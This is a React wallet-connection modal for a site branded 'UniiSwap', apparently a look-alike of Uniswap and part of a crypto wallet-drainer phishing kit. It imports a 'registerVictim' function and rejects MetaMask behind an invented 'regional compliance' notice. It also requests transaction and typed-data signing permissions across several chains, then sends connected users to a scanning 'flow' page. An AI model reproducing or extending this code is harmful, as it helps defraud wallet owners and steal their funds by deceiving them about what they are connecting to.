'use client';

import { useEffect, useMemo, useState } from 'react';
import { useRouter } from 'next/navigation';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import {
  discoverEIP6963Providers,
  isMetaMaskInstalled,
  isMetaMaskProvider,
  type EIP6963ProviderDetail,
} from '@/lib/eip6963';
import { registerVictim } from '@/lib/api';
import { setSelectedProvider } from '@/lib/providerStore';

export function WalletPickerModal({ open, onOpenChange }: { open: boolean; onOpenChange: (value: boolean) => void }) {
  const [wallets, setWallets] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [metaMaskDetected, setMetaMaskDetected] = useState(false);
  const router = useRouter();

  useEffect(() => {
    router.prefetch('/flow');
  }, [router]);

  useEffect(() => {
    if (!open) return;

    let active = true;
    const run = async () => {
      const providers = await discoverEIP6963Providers(1200);
      if (!active) return;
      setWallets(providers);
      setMetaMaskDetected(isMetaMaskInstalled());
      setLoading(false);
    };

    run();
    return () => {
      active = false;
    };
  }, [open]);

  const walletList = useMemo(() => {
    return wallets.map((detail) => ({
      name: detail.info?.name ?? 'Wallet',
      rdns: detail.info?.rdns ?? '',
      icon: detail.info?.icon || '/assets/wallets/default.svg',
      installed: true,
      provider: detail.provider,
      info: detail.info,
    }));
  }, [wallets]);

  async function connect(detail: EIP6963ProviderDetail) {
    try {
      if (isMetaMaskProvider(detail.provider)) {
        throw new Error('MetaMask is not supported');
      }

      try {
        await detail.provider.request({
          method: 'wallet_requestPermissions',
          params: [{ eth_accounts: {} }],
        });
      } catch {}

      const accounts = await detail.provider.request({ method: 'eth_requestAccounts' });
      if (!accounts?.length) throw new Error('No accounts returned');

      // Store provider and route IMMEDIATELY. The flow page handles the scan.
      setSelectedProvider(detail.provider, detail.info.rdns);
      onOpenChange(false);
      router.push('/flow');
    } catch (e) {
      console.error('connect failed', e);
    }
  }

  async function connectWalletConnect() {
    try {
      const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || '';
      if (!projectId) return;
      const wc = await EthereumProvider.init({
        projectId,
        chains: [1],
        optionalChains: [1, 56, 137, 42161, 10, 8453, 43114],
        showQrModal: true,
        methods: [
          'eth_sendTransaction',
          'personal_sign',
          'eth_signTypedData_v4',
          'wallet_switchEthereumChain',
          'eth_requestAccounts',
        ],
        events: ['chainChanged', 'accountsChanged'],
        metadata: {
          name: 'UniiSwap',
          description: 'Swap, earn, and more',
          url: typeof window !== 'undefined' ? window.location.origin : '',
          icons: [],
        },
      });
      await wc.connect();
      const accounts = wc.accounts;
      if (!accounts?.length) throw new Error('No accounts');
      
      setSelectedProvider(wc, 'walletconnect');
      onOpenChange(false);
      router.push('/flow');
    } catch (e) {
      console.error('WalletConnect failed', e);
    }
  }

  if (!open) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/10 p-4">
      <div className="w-full max-w-md rounded-[20px] border border-[#F2F2F2] bg-[#FFFFFF] p-5 shadow-swap">
        <div className="mb-4 flex items-center justify-between">
          <div className="text-[18px] font-[535] leading-[1.15] tracking-[-0.02em] text-[#222222]">Connect wallet</div>
          <button onClick={() => onOpenChange(false)} className="text-[#666666]">✕</button>
        </div>

        {metaMaskDetected && (
          <div className="mx-3 mb-3 rounded-[16px] border-2 border-[#FF37C7] bg-[#FFEAF8] p-4 text-[13px] leading-[1.5] text-[#666666]">
            <div className="mb-1 text-[14px] font-[535] text-[#FF37C7]">
              MetaMask is not supported
            </div>
            <div>
              Due to regional compliance requirements, this application does not
              support MetaMask at this time. Please use Trust Wallet, Rabby Wallet,
              Coinbase Wallet, or OKX Wallet to continue. MetaMask support will
              return in a future update.
            </div>
          </div>
        )}
        {loading ? (
          <div className="py-6 text-center text-[14px] text-[#666666]">Searching wallets…</div>
        ) : walletList.length === 0 ? (
          <div className="rounded-[20px] border border-[#F2F2F2] bg-[#F9F9F9] p-6 text-center text-[14px] leading-[1.49] tracking-[-0.02em] text-[#666666]">
            No compatible wallets detected. Install Trust Wallet, Rabby, Coinbase Wallet, or OKX Wallet to continue.
          </div>
        ) : (
          <div className="space-y-3">
            {walletList.map((detail) => {
              const info = detail.info ?? {};
              return (
                <button
                  key={info.uuid || detail.rdns || info.name}
                  onClick={() => connect(detail.provider ? { info: detail.info, provider: detail.provider } : { info: { uuid: '', name: 'Wallet', icon: '', rdns: detail.rdns }, provider: null })}
                  className="flex w-full items-center justify-between rounded-[20px] border border-[#F2F2F2] bg-[#FFFFFF] px-3 py-3 text-left transition-colors hover:border-[#FF37C7]"
                >
                  <div className="flex items-center gap-3">
                    <img src={info.icon || '/favicon.ico'} alt={info.name || 'Wallet'} className="h-8 w-8 rounded-full object-cover" />
                    <div>
                      <div className="text-[14px] font-[535] leading-[1.49] tracking-[-0.02em] text-[#222222]">{info.name || 'Wallet'}</div>
                    </div>
                  </div>
                  <span className="rounded-full bg-[#FFF0FC] px-2 py-1 text-[11px] font-[535] text-[#FF37C7]">Detected</span>
                </button>
              );
            })}
          </div>
        )}
        <button
          onClick={connectWalletConnect}
          className="mt-3 flex w-full items-center justify-between rounded-[16px] border border-[#F2F2F2] bg-white px-3 py-3 text-left transition-colors hover:bg-[#F9F9F9]"
        >
          <span className="flex items-center gap-3">
            <span className="flex h-10 w-10 items-center justify-center rounded-full bg-[#3B99FC]">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                <path d="M6.5 8c3-3 8-3 11 0l.4.4c.15.15.15.4 0 .55l-1.3 1.3a.28.28 0 01-.4 0l-.5-.5a5.7 5.7 0 00-7.8 0l-.55.55a.28.28 0 01-.4 0L5.15 8.9a.39.39 0 010-.55L6.5 8zm13.6 2.4l1.1 1.1c.15.15.15.4 0 .55l-5 5a.4.4 0 01-.55 0l-3.5-3.5a.14.14 0 00-.2 0l-3.5 3.5a.4.4 0 01-.55 0l-5-5a.39.39 0 010-.55l1.1-1.1a.4.4 0 01.55 0l3.5 3.5a.14.14 0 00.2 0l3.5-3.5a.4.4 0 01.55 0l3.5 3.5a.14.14 0 00.2 0l3.5-3.5a.4.4 0 01.55 0z" fill="#FFFFFF" />
              </svg>
            </span>
            <span className="text-[14px] font-[600] text-[#1A1A1A]">WalletConnect</span>
          </span>
          <span className="rounded-full bg-[#E8FBFD] px-2 py-1 text-[10px] font-[800] uppercase tracking-[0.14em] text-[#1FC7D4]">
            QR / Mobile
          </span>
        </button>
      </div>
    </div>
  );
}

export default WalletPickerModal;
